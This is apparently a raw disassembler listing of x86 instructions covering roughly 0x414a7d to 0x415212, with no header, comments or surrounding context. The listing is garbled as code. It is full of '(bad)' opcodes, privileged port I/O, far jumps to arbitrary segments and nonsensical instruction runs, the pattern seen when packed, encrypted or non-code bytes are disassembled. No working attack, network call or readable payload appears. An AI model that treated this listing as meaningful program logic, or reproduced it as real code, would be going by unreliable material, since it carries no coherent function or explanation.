  414a7d:	repz and bh,BYTE PTR [edi+ecx*1+0x6]
  414a82:	ss jae 0x414af8
  414a85:	inc    ebp
  414a86:	sub    al,0x74
  414a88:	shl    BYTE PTR [ebx+0x694bb26a],1
  414a8e:	pop    edi
  414a8f:	nop
  414a90:	ss call 0x2ec0bf5b
  414a96:	das    
  414a97:	xor    esi,DWORD PTR [esi+0x5f190f80]
  414a9d:	or     dh,BYTE PTR [edx+eax*8+0x2d]
  414aa1:	pop    edi
  414aa2:	mov    fs,WORD PTR [esi]
  414aa4:	sahf   
  414aa5:	mov    DWORD PTR [esi],ecx
  414aa7:	xchg   BYTE PTR [ebx-0x43bac628],cl
  414aad:	adc    eax,0xb5cf1c0a
  414ab2:	and    BYTE PTR [ecx+0x1ec22a2f],0x89
  414ab9:	popf   
  414aba:	repnz pop ebx
  414abc:	mov    ebp,0xfcffb114
  414ac1:	fs jl  0x414a58
  414ac4:	adc    ecx,DWORD PTR [edx]
  414ac6:	cld    
  414ac7:	icebp  
  414ac8:	leave  
  414ac9:	std    
  414aca:	ficomp DWORD PTR [ebx+0x4cc3394e]
  414ad0:	mov    cl,BYTE PTR [esi+ebx*4-0x1c95192b]
  414ad7:	add    DWORD PTR [edi+esi*1-0x1f],esp
  414adb:	jle    0x414b54
  414add:	int    0xe2
  414adf:	push   cs
  414ae0:	leave  
  414ae1:	scas   eax,DWORD PTR es:[edi]
  414ae2:	and    DWORD PTR [eax+0x62],esp
  414ae5:	aam    0xbe
  414ae7:	test   esp,eax
  414ae9:	outs   dx,DWORD PTR ds:[esi]
  414aea:	ja     0x414b51
  414aec:	cmp    eax,0xc3e89e1
  414af1:	iret   
  414af2:	js     0x414b2c
  414af4:	sub    DWORD PTR [edi],edi
  414af6:	xlat   BYTE PTR ds:[ebx]
  414af8:	jns    0x414ac6
  414afa:	push   ecx
  414afb:	cmp    al,0xf9
  414afd:	inc    eax
  414afe:	push   ecx
  414aff:	ds mov bh,0x22
  414b02:	sbb    eax,0xec626c4
  414b07:	pop    ebp
  414b08:	sub    ebx,DWORD PTR [edx+0x448afebe]
  414b0e:	ja     0x414ac0
  414b10:	or     al,0x6a
  414b12:	mov    edi,0x5b3ee06b
  414b17:	and    edi,DWORD PTR [esi-0x2c6a5362]
  414b1d:	pop    esp
  414b1e:	push   es
  414b1f:	pop    ebx
  414b20:	inc    esi
  414b21:	cmp    al,0xfb
  414b23:	test   esp,eax
  414b25:	iret   
  414b26:	adc    edi,esp
  414b28:	push   esi
  414b29:	or     eax,0x5c5bc7b6
  414b2e:	call   0x257c:0x9b162f48
  414b35:	fs js  0x414b02
  414b38:	pop    es
  414b39:	es push edi
  414b3b:	das    
  414b3c:	fiadd  DWORD PTR [ebp-0x54]
  414b3f:	and    edi,ebp
  414b41:	mov    ds,WORD PTR [edx+0x30b65a98]
  414b47:	fistp  DWORD PTR [edi]
  414b49:	dec    edx
  414b4a:	mov    edi,0xfbe97f2c
  414b4f:	jl     0x414b8e
  414b51:	jnp    0x414ad7
  414b53:	push   0xffffff9a
  414b55:	bswap  edi
  414b57:	add    BYTE PTR [ebp+0x6],bl
  414b5a:	icebp  
  414b5b:	adc    esp,DWORD PTR [edi+eiz*1]
  414b5e:	stos   DWORD PTR es:[edi],eax
  414b5f:	lods   al,BYTE PTR ds:[esi]
  414b60:	dec    esp
  414b61:	mov    dh,0xcc
  414b63:	scas   eax,DWORD PTR es:[edi]
  414b64:	aaa    
  414b65:	pop    es
  414b66:	cld    
  414b67:	nop
  414b68:	jns    0x414b38
  414b6a:	cld    
  414b6b:	mov    es,WORD PTR [ecx-0x23]
  414b6e:	fwait
  414b6f:	mov    eax,ds:0xf65072ff
  414b74:	addr16 (bad) 
  414b76:	les    eax,FWORD PTR [edi]
  414b78:	sub    ebp,DWORD PTR [edx]
  414b7a:	cmp    eax,eax
  414b7c:	pop    ss
  414b7d:	repnz sbb eax,0x519ff7d3
  414b83:	xor    al,0x76
  414b85:	pusha  
  414b86:	call   0x5585cf83
  414b8b:	xor    al,0x3d
  414b8d:	rcr    DWORD PTR [edi-0x49],1
  414b90:	mov    cs,esp
  414b92:	ret    0x746f
  414b95:	pusha  
  414b96:	fs push eax
  414b98:	adc    edi,esp
  414b9a:	or     BYTE PTR [esi],0x62
  414b9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b9e:	jno    0x414b52
  414ba0:	jns    0x414b70
  414ba2:	pop    edi
  414ba3:	and    bh,BYTE PTR [ecx+edx*1]
  414ba6:	mov    eax,DWORD PTR [esi+0x5c2e64d0]
  414bac:	rol    BYTE PTR [ebx],1
  414bae:	fcmovu st,st(1)
  414bb0:	arpl   WORD PTR ds:0x7e0cd10b,bx
  414bb6:	popa   
  414bb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bb8:	out    dx,eax
  414bb9:	std    
  414bba:	mov    esi,0x71e16186
  414bbf:	inc    ebp
  414bc0:	dec    ebp
  414bc1:	sbb    edx,DWORD PTR [edi-0x1a]
  414bc4:	stc    
  414bc5:	mov    ah,0xbc
  414bc7:	dec    ebp
  414bc8:	mov    eax,ds:0xe5d16dc4
  414bcd:	sub    al,0x39
  414bcf:	pop    ss
  414bd0:	add    al,0x4
  414bd2:	std    
  414bd3:	mov    ch,0x14
  414bd5:	cld    
  414bd6:	xchg   ecx,eax
  414bd7:	xchg   esi,eax
  414bd8:	pop    ds
  414bd9:	(bad)  
  414bda:	inc    BYTE PTR [edx]
  414bdc:	cld    
  414bdd:	cwde   
  414bde:	push   ebx
  414bdf:	mov    edx,0xde987602
  414be4:	rcl    BYTE PTR [edx+0x32],cl
  414be7:	dec    edi
  414be8:	(bad)  
  414be9:	push   edi
  414bea:	pop    edi
  414beb:	sub    al,0xac
  414bed:	jbe    0x414bb7
  414bef:	leave  
  414bf0:	sub    bh,BYTE PTR [ebx-0x13626e11]
  414bf6:	mov    esp,0x4e1916fb
  414bfb:	lock jecxz 0x414bdf
  414bfe:	in     al,dx
  414bff:	pushf  
  414c00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c01:	cwde   
  414c02:	fidiv  DWORD PTR [ebp+eiz*8-0x49ebdb9]
  414c09:	das    
  414c0a:	sub    al,0xae
  414c0c:	jns    0x414c28
  414c0e:	loop   0x414c0f
  414c10:	push   edx
  414c11:	xor    eax,0xc35d4277
  414c16:	jae    0x414c44
  414c18:	out    dx,al
  414c19:	std    
  414c1a:	or     DWORD PTR [edi+eax*8-0x28],esp
  414c1e:	sbb    DWORD PTR [eax-0x3],0x62
  414c22:	sbb    edx,edi
  414c24:	mov    esi,gs
  414c26:	mov    eax,0x2371eaac
  414c2b:	pushf  
  414c2c:	lods   eax,DWORD PTR ds:[esi]
  414c2d:	xor    eax,0x6418f1e
  414c32:	cmp    DWORD PTR [ecx],edx
  414c34:	int    0x29
  414c36:	(bad)  
  414c37:	cli    
  414c38:	pop    ecx
  414c39:	popf   
  414c3a:	mov    edx,0xa2f47fc6
  414c3f:	sbb    DWORD PTR [edx],0x1c05939d
  414c45:	scas   eax,DWORD PTR es:[edi]
  414c46:	fld    TBYTE PTR [ecx+0x18f9f5db]
  414c4c:	add    esp,ecx
  414c4e:	cwde   
  414c4f:	pop    esp
  414c50:	outs   dx,DWORD PTR ds:[esi]
  414c51:	in     eax,0x95
  414c53:	fwait
  414c54:	dec    ecx
  414c55:	lods   eax,DWORD PTR ds:[esi]
  414c56:	push   ebx
  414c57:	je     0x783543a0
  414c5d:	adc    al,0x31
  414c5f:	mov    dh,al
  414c61:	jno    0x414c74
  414c63:	adc    edx,eax
  414c65:	xchg   edi,eax
  414c66:	inc    edi
  414c67:	aad    0xbe
  414c69:	call   0xa64a:0xfe977f9a
  414c70:	(bad)  
  414c71:	pop    esi
  414c72:	mov    dl,BYTE PTR [ecx]
  414c74:	nop
  414c75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c76:	test   BYTE PTR [esi],bh
  414c78:	and    DWORD PTR [ebp+0x6b],esp
  414c7b:	aad    0x98
  414c7d:	mov    bl,ch
  414c7f:	inc    ecx
  414c80:	dec    ecx
  414c81:	iret   
  414c82:	cmc    
  414c83:	mov    ebp,0x9fe522a1
  414c88:	pop    edx
  414c89:	or     DWORD PTR [ebx-0x18],edi
  414c8c:	sub    eax,0x9256ec13
  414c91:	(bad)  
  414c92:	push   ecx
  414c93:	dec    ebp
  414c94:	aam    0x41
  414c96:	xchg   ebp,eax
  414c97:	xchg   DWORD PTR [eax-0x3c5ccf3b],edx
  414c9d:	mov    esp,DWORD PTR [edi+0x35]
  414ca0:	inc    ebp
  414ca1:	std    
  414ca2:	jns    0x414d0d
  414ca4:	je     0x414c86
  414ca6:	mov    ebp,0xecff9ed6
  414cab:	xchg   edx,eax
  414cac:	jbe    0x414cfe
  414cae:	sbb    DWORD PTR [edi+eax*4-0x43874ba1],esp
  414cb5:	es (bad) 
  414cb7:	out    dx,eax
  414cb8:	dec    DWORD PTR [ebx+0x18]
  414cbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cbc:	jmp    0x414d0b
  414cbe:	xchg   BYTE PTR [eax-0xf],bl
  414cc1:	xor    BYTE PTR [ecx-0xd],bh
  414cc4:	sub    eax,0x3696bba0
  414cc9:	or     DWORD PTR [ecx+esi*4+0x4b],ecx
  414ccd:	lahf   
  414cce:	(bad)  
  414ccf:	fisttp DWORD PTR [ecx+0x7cf849e]
  414cd5:	pop    ecx
  414cd6:	pusha  
  414cd7:	jnp    0x414c9e
  414cd9:	jp     0x414cbc
  414cdb:	adc    bh,dl
  414cdd:	adc    bh,BYTE PTR [edx+0x58]
  414ce0:	lock mov eax,0x706dd165
  414ce6:	loope  0x414d13
  414ce8:	pop    edx
  414ce9:	mov    ds:0x543f55ee,al
  414cee:	sbb    BYTE PTR [edi-0x3f3a631c],dh
  414cf4:	mov    DWORD PTR [esi+0x6f369e28],eax
  414cfa:	jns    0x414d38
  414cfc:	and    BYTE PTR [ebx+0x46],bl
  414cff:	xchg   esi,eax
  414d00:	imul   edi,DWORD PTR [eax],0x960eae1a
  414d06:	shl    esi,cl
  414d08:	or     eax,0xec33dce5
  414d0d:	xchg   ebx,eax
  414d0e:	out    0x6e,eax
  414d10:	outs   dx,DWORD PTR ds:[esi]
  414d11:	retf   0xf9a
  414d14:	shr    dl,0x45
  414d17:	pop    edi
  414d18:	pop    eax
  414d19:	into   
  414d1a:	or     edi,esi
  414d1c:	lods   al,BYTE PTR ds:[esi]
  414d1d:	stc    
  414d1e:	xor    ebp,DWORD PTR [eax+0x67]
  414d21:	aaa    
  414d22:	xor    BYTE PTR [esi],dl
  414d24:	mov    al,0xf1
  414d26:	leave  
  414d27:	push   edi
  414d28:	pop    es
  414d29:	pusha  
  414d2a:	jg     0x414d3e
  414d2c:	dec    edx
  414d2d:	pusha  
  414d2e:	push   ebx
  414d2f:	ja     0x414d0a
  414d31:	lods   eax,DWORD PTR ds:[esi]
  414d32:	sbb    dl,0xa9
  414d35:	and    eax,0x55d214a3
  414d3a:	cdq    
  414d3b:	sti    
  414d3c:	mov    esi,0x51c024aa
  414d41:	xabort 0xb8
  414d44:	fdivr  st(4),st
  414d46:	(bad)  
  414d47:	out    0x3d,al
  414d49:	sbb    DWORD PTR ds:0x1f15ebe8,0xfffffff2
  414d50:	pop    esi
  414d51:	fdivp  st(5),st
  414d53:	mov    WORD PTR [ebp-0x5ca42ebe],?
  414d59:	dec    esp
  414d5a:	test   eax,0x5101000f
  414d5f:	outs   dx,BYTE PTR ds:[esi]
  414d60:	cmp    DWORD PTR [ecx-0x6a],esi
  414d63:	add    al,0x69
  414d65:	(bad)
  414d68:	fsubrp st(1),st
  414d6a:	stos   BYTE PTR es:[edi],al
  414d6b:	mov    edx,0x435443bd
  414d70:	mov    edi,0x5e04ce6f
  414d75:	pop    ss
  414d76:	xor    DWORD PTR [ecx],0x1f2fea2c
  414d7c:	ja     0x414d30
  414d7e:	sahf   
  414d7f:	popa   
  414d80:	cmp    DWORD PTR [ebx+0x69],ebx
  414d83:	cld    
  414d84:	out    dx,eax
  414d85:	fistp  WORD PTR [edx+0x33]
  414d88:	(bad)  
  414d89:	mov    esp,0x53de0e03
  414d8e:	cmp    DWORD PTR [esi+ebx*8],edx
  414d91:	jmp    0x77a8:0xce2f72d
  414d98:	in     al,0xba
  414d9a:	repnz mov edi,DWORD PTR [edx]
  414d9d:	sbb    DWORD PTR ds:0x8b539b0e,eax
  414da3:	mov    ebp,ecx
  414da5:	repz mov dl,0xab
  414da8:	mov    esp,0x6f9f010f
  414dad:	test   eax,0x37ed8274
  414db2:	push   ss
  414db3:	shr    BYTE PTR [edx],cl
  414db5:	(bad)  
  414db6:	add    DWORD PTR [edi+0x1f],edx
  414db9:	mov    bh,0xbd
  414dbb:	stos   DWORD PTR es:[edi],eax
  414dbc:	dec    edi
  414dbd:	retf   0xd85f
  414dc0:	ud0    edi,DWORD PTR [esi+0x6a31f5ea]
  414dc7:	pop    ss
  414dc8:	js     0x414dbd
  414dca:	add    eax,0xe1c8eab5
  414dd0:	and    eax,0x2ee80f77
  414dd5:	mov    ds:0xaab5163c,eax
  414dda:	test   al,0x26
  414ddc:	dec    ebp
  414ddd:	cmovnp esi,DWORD PTR [ebp-0x4af33d4e]
  414de4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414de5:	retf   0x7849
  414de8:	xor    BYTE PTR [esp+eax*8+0x9],ah
  414dec:	pop    eax
  414ded:	ret    0xecfb
  414df0:	or     eax,edi
  414df2:	call   0x8db24faa
  414df7:	cmp    BYTE PTR [ebx],dh
  414df9:	iret   
  414dfa:	ja     0x414e75
  414dfc:	ins    DWORD PTR es:[edi],dx
  414dfd:	jno    0x414e4f
  414dff:	sub    BYTE PTR [ecx],al
  414e01:	aad    0x34
  414e03:	frstor [esi+0x61]
  414e06:	int    0x47
  414e08:	icebp  
  414e09:	int3   
  414e0a:	pop    ecx
  414e0b:	cmp    BYTE PTR ds:0xb96136e3,0xa9
  414e12:	or     bh,BYTE PTR [eax-0x3672e6ef]
  414e18:	cmc    
  414e19:	gs mov ecx,0x517aa5da
  414e1f:	test   al,0x86
  414e21:	aam    0x6e
  414e23:	ds jns 0x414e85
  414e26:	pop    esi
  414e27:	and    DWORD PTR [ecx+0x6c6864b6],edi
  414e2d:	xchg   ecx,eax
  414e2e:	ror    bl,1
  414e30:	mov    edx,0x1c3d14f6
  414e35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e36:	out    0xef,al
  414e38:	mov    eax,ds:0x8ba55467
  414e3d:	not    BYTE PTR [esi+ebp*4-0x63e9bf31]
  414e44:	stos   BYTE PTR es:[edi],al
  414e45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e47:	cmc    
  414e48:	and    eax,ebp
  414e4a:	jecxz  0x414e9c
  414e4c:	fst    st(7)
  414e4e:	jno    0x414e28
  414e50:	mov    esp,0xda5df891
  414e55:	mov    ch,0xff
  414e57:	stos   DWORD PTR es:[edi],eax
  414e58:	xchg   ebp,eax
  414e59:	cdq    
  414e5a:	dec    ebx
  414e5b:	dec    BYTE PTR [ecx+0x60e0f99e]
  414e61:	xor    eax,ecx
  414e63:	cs cmp esp,edx
  414e66:	aas    
  414e67:	div    BYTE PTR [esp+eiz*2]
  414e6a:	out    0xce,al
  414e6c:	sbb    edx,ebx
  414e6e:	push   es
  414e6f:	in     eax,0x4f
  414e71:	dec    edi
  414e72:	or     ah,BYTE PTR [eax-0x2]
  414e75:	imul   ecx,DWORD PTR [ebx],0xffffffdd
  414e78:	dec    ecx
  414e79:	xor    dh,BYTE PTR [esp+ebx*1+0x2c]
  414e7d:	mov    ebx,0x3b747f23
  414e82:	push   cs
  414e83:	sti    
  414e84:	aas    
  414e85:	jp     0x414eb3
  414e87:	adc    BYTE PTR [ebx-0x79],0x73
  414e8b:	lahf   
  414e8c:	mov    bh,0x7c
  414e8e:	add    DWORD PTR [ecx-0x1b90b9c2],edi
  414e94:	jbe    0x414e31
  414e96:	popa   
  414e97:	(bad)  
  414e98:	xor    BYTE PTR [edx-0x39],al
  414e9b:	mov    ds:0x87bc11ad,al
  414ea0:	not    cl
  414ea2:	test   eax,0xd6233840
  414ea7:	mov    bh,0xbc
  414ea9:	sub    DWORD PTR [ecx-0x2e],ebp
  414eac:	sbb    ebx,DWORD PTR [eax-0x7a]
  414eaf:	add    al,0x42
  414eb1:	sbb    al,0x13
  414eb3:	or     eax,0x54289b9
  414eb8:	adc    BYTE PTR [ebx],cl
  414eba:	push   esp
  414ebb:	pop    edx
  414ebc:	mov    ds:0x3c5b2026,al
  414ec1:	mov    ecx,0xeff72277
  414ec6:	ds push 0x26
  414ec9:	dec    edx
  414eca:	and    dl,BYTE PTR [ebp+0x3e]
  414ecd:	mov    ds:0xca31ab34,al
  414ed2:	cld    
  414ed3:	aad    0xbd
  414ed5:	jmp    0xc28789c5
  414eda:	push   eax
  414edb:	stos   DWORD PTR es:[edi],eax
  414edc:	sub    BYTE PTR [edi],bl
  414ede:	(bad)  
  414edf:	call   0x12278176
  414ee4:	mov    ebx,0xa9e14cc9
  414ee9:	xchg   BYTE PTR [ebp+0x3873e41a],al
  414eef:	jno    0x414ec4
  414ef1:	shl    BYTE PTR [esi-0x22],1
  414ef4:	ret    0x746f
  414ef7:	push   0x74
  414ef9:	cs inc esp
  414efb:	into   
  414efc:	retf   0x4e6f
  414eff:	push   es
  414f00:	mov    bl,0xcf
  414f02:	inc    edx
  414f03:	xchg   edx,eax
  414f04:	push   0x322bc8af
  414f09:	jo     0x414f53
  414f0b:	mov    ebx,0x3b74577e
  414f10:	sbb    al,0xf2
  414f12:	mov    eax,ds:0x1250d31e
  414f17:	add    bl,BYTE PTR [ecx]
  414f19:	call   0x7913:0x1b78b48e
  414f20:	mov    ah,0xb9
  414f22:	pop    esi
  414f23:	mov    esp,0xa3935e03
  414f28:	loopne 0x414f86
  414f2a:	fwait
  414f2b:	nop
  414f2c:	cmp    ah,BYTE PTR [edx]
  414f2e:	push   cs
  414f2f:	add    esi,DWORD PTR [edx]
  414f31:	cwde   
  414f32:	cmp    al,0x96
  414f35:	ss jecxz 0x414f49
  414f38:	fs jecxz 0x414fb4
  414f3b:	into   
  414f3c:	lods   eax,DWORD PTR ds:[esi]
  414f3d:	dec    edi
  414f3e:	and    bl,0x3c
  414f41:	sbb    bh,BYTE PTR [edi+edx*1-0x60433bca]
  414f48:	aad    0xb4
  414f4a:	ret    
  414f4b:	pop    es
  414f4c:	(bad)  ds:0x2c97baf8
  414f52:	xor    eax,0xfdea0bf5
  414f57:	aas    
  414f58:	ds push esi
  414f5a:	or     BYTE PTR [esp+eiz*8+0x49],0x54
  414f5f:	cdq    
  414f60:	sub    DWORD PTR [ebp+0x3c],0x31250569
  414f67:	mov    WORD PTR [edi],cs
  414f69:	out    0xa6,eax
  414f6b:	in     al,0xf9
  414f6d:	push   es
  414f6e:	xor    eax,0x5c8ed0bb
  414f73:	push   edi
  414f74:	add    eax,0x2d8f123
  414f79:	or     ch,BYTE PTR [esi-0x76d2681f]
  414f7f:	jne    0x414ff2
  414f81:	mov    esi,ss
  414f83:	(bad)  
  414f84:	scas   al,BYTE PTR es:[edi]
  414f85:	leave  
  414f86:	arpl   WORD PTR [ebp+0x27],dx
  414f89:	dec    eax
  414f8a:	add    edx,edi
  414f8c:	leave  
  414f8d:	push   esi
  414f8e:	dec    edi
  414f8f:	fimul  DWORD PTR [edx+0x461f1df9]
  414f95:	outs   dx,BYTE PTR ds:[esi]
  414f96:	inc    ecx
  414f97:	cmp    DWORD PTR [edx-0x392f7377],ebx
  414f9d:	dec    esi
  414f9e:	shl    DWORD PTR [ecx+0x67],0xe9
  414fa2:	sahf   
  414fa3:	pop    ss
  414fa4:	out    dx,eax
  414fa5:	aas    
  414fa6:	push   es
  414fa7:	sbb    DWORD PTR [ecx],ebp
  414fa9:	bound  esp,QWORD PTR [esi+0x508492dd]
  414faf:	cld    
  414fb0:	mov    esp,0xce7208cd
  414fb5:	or     al,0x1c
  414fb7:	std    
  414fb8:	stc    
  414fb9:	inc    ebp
  414fba:	cdq    
  414fbb:	repz loope 0x415013
  414fbe:	std    
  414fbf:	or     eax,0xe0bf29c
  414fc4:	mov    eax,ds:0x4bc9455e
  414fc9:	mov    ch,0xf9
  414fcb:	js     0x41500e
  414fcd:	push   ebx
  414fce:	push   esi
  414fcf:	(bad)  
  414fd0:	mov    eax,0x37dbbb2d
  414fd5:	stc    
  414fd6:	xchg   ebp,eax
  414fd7:	adc    BYTE PTR [ebx-0x78],cl
  414fda:	or     dl,BYTE PTR [eax]
  414fdc:	dec    eax
  414fdd:	mov    al,ds:0xb3661452
  414fe2:	gs inc esi
  414fe4:	or     esp,0xffffffdb
  414fe7:	mov    al,0x24
  414fe9:	outs   dx,DWORD PTR ds:[esi]
  414fea:	or     ecx,eax
  414fec:	cmp    BYTE PTR [esi-0x3fd53c50],dl
  414ff2:	xor    ah,BYTE PTR [edi*1+0x164855ad]
  414ff9:	sbb    ebx,ecx
  414ffb:	in     al,dx
  414ffc:	fadd   QWORD PTR [esi]
  414ffe:	ret    
  414fff:	repnz dec esp
  415001:	sub    eax,0x8b9120e7
  415006:	add    ecx,DWORD PTR ds:0x55eed165
  41500c:	scas   al,BYTE PTR es:[edi]
  41500d:	mov    ecx,0x3a085409
  415012:	add    al,0xcb
  415014:	mov    esi,0x453547ea
  415019:	cmp    DWORD PTR [edi-0x58ecbb4c],eax
  41501f:	into   
  415020:	mov    DWORD PTR [esi+0x4acca081],esp
  415026:	and    BYTE PTR [ebx-0x22],ah
  415029:	out    dx,al
  41502a:	(bad)  
  41502c:	loopne 0x415097
  41502e:	xchg   ecx,eax
  41502f:	push   esi
  415030:	rcl    BYTE PTR [ebx-0x617d804c],1
  415036:	pop    ss
  415037:	jle    0x41503f
  415039:	cld    
  41503a:	mov    edx,0x8bb16943
  41503f:	fisubr DWORD PTR [edi-0x75]
  415042:	or     DWORD PTR [edx],0xd379ea7d
  415048:	adc    ch,BYTE PTR [eax+ecx*2-0x1d160f9f]
  41504f:	sbb    al,0xcb
  415051:	(bad)
  415054:	dec    esi
  415055:	add    edx,esi
  415057:	fwait
  415058:	xchg   esp,eax
  415059:	cli    
  41505a:	and    al,0xcf
  41505c:	outs   dx,DWORD PTR ds:[esi]
  41505d:	inc    edx
  41505e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41505f:	pop    esp
  415060:	push   es
  415061:	and    bh,BYTE PTR [eax]
  415063:	into   
  415064:	loop   0x41507e
  415066:	jno    0x41502d
  415068:	inc    ebp
  415069:	push   ebp
  41506a:	scas   eax,DWORD PTR es:[edi]
  41506b:	xchg   esp,eax
  41506c:	stos   DWORD PTR es:[edi],eax
  41506d:	clc    
  41506e:	sub    al,BYTE PTR [eax+ebp*4]
  415071:	mov    ebx,0x9bbe796c
  415076:	mov    edx,esp
  415078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415079:	sbb    ebx,DWORD PTR [ebx]
  41507b:	jbe    0x415083
  41507d:	test   DWORD PTR [edx+ebp*4+0x30],edi
  415081:	and    bl,BYTE PTR [esi]
  415083:	push   eax
  415084:	xor    al,0x64
  415086:	std    
  415087:	mov    eax,ds:0x36a4e044
  41508c:	pop    ecx
  41508d:	add    DWORD PTR [ebx+ecx*1-0x7cd483be],edi
  415094:	xlat   BYTE PTR ds:[ebx]
  415095:	test   esi,esp
  415097:	or     cl,ch
  415099:	inc    ebp
  41509a:	cmp    BYTE PTR [ecx],dh
  41509c:	out    dx,al
  41509d:	sub    eax,0xf734034d
  4150a2:	push   ebx
  4150a3:	add    edi,DWORD PTR [ebx-0x25e02f19]
  4150a9:	cdq    
  4150aa:	jb     0x4150bf
  4150ac:	fwait
  4150ad:	lahf   
  4150ae:	cmp    ecx,ebx
  4150b0:	retf   0x35ca
  4150b3:	jno    0x4150dd
  4150b5:	lock inc esi
  4150b7:	das    
  4150b8:	in     al,0xf3
  4150ba:	mov    ds:0x4ab9c26,al
  4150bf:	jnp    0x41512a
  4150c1:	fisttp QWORD PTR [edi]
  4150c3:	sbb    BYTE PTR [eax-0x33342abb],al
  4150c9:	cdq    
  4150ca:	scas   al,BYTE PTR es:[edi]
  4150cb:	push   eax
  4150cc:	push   ss
  4150cd:	mov    ch,0xd9
  4150cf:	leave  
  4150d0:	outs   dx,BYTE PTR ds:[esi]
  4150d1:	sub    ebp,DWORD PTR [esi-0x76]
  4150d4:	ins    DWORD PTR es:[edi],dx
  4150d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150d6:	sbb    dl,dh
  4150d8:	jbe    0x4150e4
  4150da:	lahf   
  4150db:	jmp    0xf639:0xb44d5868
  4150e2:	fwait
  4150e3:	cmp    esp,DWORD PTR [ecx+0xd998682]
  4150e9:	xchg   ecx,eax
  4150ea:	mov    eax,0x4912dee
  4150ef:	mov    ah,0x73
  4150f1:	cmp    DWORD PTR [eax+0x6a],eax
  4150f4:	push   ebx
  4150f5:	lods   al,BYTE PTR ds:[esi]
  4150f6:	mov    ch,0x2e
  4150f8:	pop    ebp
  4150f9:	push   es
  4150fa:	(bad)  
  4150fb:	(bad)  
  4150fc:	sbb    BYTE PTR [edx],dl
  4150fe:	addr16 xchg ebx,eax
  415100:	adc    BYTE PTR [esi+0x26bd67ca],ah
  415106:	repz pop ecx
  415108:	mov    ebp,0x5a3d3998
  41510d:	pop    esi
  41510e:	add    al,0xe9
  415110:	adc    BYTE PTR [eax-0x62b1fbfa],bh
  415116:	fst    QWORD PTR [eiz*4-0x202720ae]
  41511d:	out    0x2c,eax
  41511f:	xchg   dh,dh
  415121:	cs inc ecx
  415123:	andps  xmm5,XMMWORD PTR [edx-0x578a3048]
  41512a:	mov    bl,0xe4
  41512c:	pushf  
  41512d:	in     al,0xee
  41512f:	iret   
  415130:	dec    ebx
  415131:	iret   
  415132:	sbb    ah,BYTE PTR [edi]
  415134:	push   edi
  415135:	add    ah,BYTE PTR [ecx+0x5af2e269]
  41513b:	xor    ah,ah
  41513d:	into   
  41513e:	sub    edi,DWORD PTR [edx]
  415140:	push   ds
  415141:	push   cs
  415142:	dec    esi
  415143:	shr    ecx,cl
  415145:	leave  
  415146:	stos   DWORD PTR es:[edi],eax
  415147:	retf   
  415148:	dec    edi
  415149:	test   DWORD PTR [ecx+0x6870b265],esp
  41514f:	mov    cl,0x58
  415151:	stos   BYTE PTR es:[edi],al
  415152:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415153:	stc    
  415154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415155:	cmp    al,0xb3
  415157:	mov    dh,0xca
  415159:	(bad)  
  41515a:	or     al,0x99
  41515c:	mov    eax,ds:0xcc49817f
  415161:	int3   
  415162:	xchg   edi,eax
  415163:	jmp    DWORD PTR [eiz*1+0x74617429]
  41516a:	xchg   ebp,eax
  41516b:	ror    ebx,cl
  41516d:	test   eax,0x4ac5c012
  415172:	xchg   ecx,eax
  415173:	and    eax,0xbf1e59d
  415178:	adc    DWORD PTR [eax+ebx*8-0x5ba77853],edx
  41517f:	or     DWORD PTR [eax+0x13],edi
  415182:	pop    es
  415183:	call   0xf5d3:0xb4f0078c
  41518a:	xchg   edx,eax
  41518b:	imul   ecx,DWORD PTR [ebx-0x23],0xffffffb1
  41518f:	mov    bl,0x8
  415191:	ins    BYTE PTR es:[edi],dx
  415192:	sub    DWORD PTR [esi-0x471b2ad4],esp
  415198:	pop    ebx
  415199:	push   0xffffff89
  41519b:	in     al,0x98
  41519d:	clc    
  41519e:	outs   dx,DWORD PTR ds:[esi]
  41519f:	jge    0x415144
  4151a1:	mov    bl,0xd7
  4151a3:	mov    ah,0x4c
  4151a5:	xchg   esi,eax
  4151a6:	push   edx
  4151a7:	out    dx,eax
  4151a8:	mov    edx,0x29727ceb
  4151ad:	mov    cl,0xc2
  4151af:	inc    ecx
  4151b0:	mov    ds:0xc11445f5,eax
  4151b5:	cdq    
  4151b6:	mov    dl,0x65
  4151b8:	lods   al,BYTE PTR ds:[esi]
  4151b9:	pop    esp
  4151ba:	enter  0x570a,0xf0
  4151be:	dec    ebp
  4151bf:	mov    BYTE PTR [ebp-0x56],bl
  4151c2:	and    al,0xe
  4151c4:	xchg   esi,eax
  4151c5:	out    dx,eax
  4151c6:	adc    al,BYTE PTR [edi-0x615aaa93]
  4151cc:	push   0xd99f4f8a
  4151d1:	test   BYTE PTR [esi],ch
  4151d3:	sbb    bh,ch
  4151d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151d6:	inc    edi
  4151d7:	add    al,0x1f
  4151d9:	loope  0x4151ee
  4151db:	(bad)  
  4151dc:	(bad)  
  4151de:	call   DWORD PTR [ebx+0x9]
  4151e1:	dec    esp
  4151e2:	dec    ebp
  4151e3:	sub    DWORD PTR [ebp+0x6b726d90],edi
  4151e9:	mov    al,0x3b
  4151eb:	adc    al,BYTE PTR [ebx]
  4151ed:	inc    ebx
  4151ee:	jmp    0x79fb:0x593bf111
  4151f5:	ins    DWORD PTR es:[edi],dx
  4151f6:	stos   DWORD PTR es:[edi],eax
  4151f7:	mov    WORD PTR [esi],fs
  4151f9:	push   eax
  4151fa:	inc    edi
  4151fb:	jbe    0x4151a8
  4151fd:	sti    
  4151fe:	jb     0x4151f6
  415200:	aad    0x14
  415202:	mov    bh,0x65
  415204:	pop    ss
  415205:	pop    edi
  415206:	es fucomp st(6)
  415209:	jae    0x4151bb
  41520b:	mov    edx,DWORD PTR [esi-0x52]
  41520e:	mov    esp,ebp
  415210:	pop    ss
  415211:	inc    edx
  415212:	loope  0x41528e
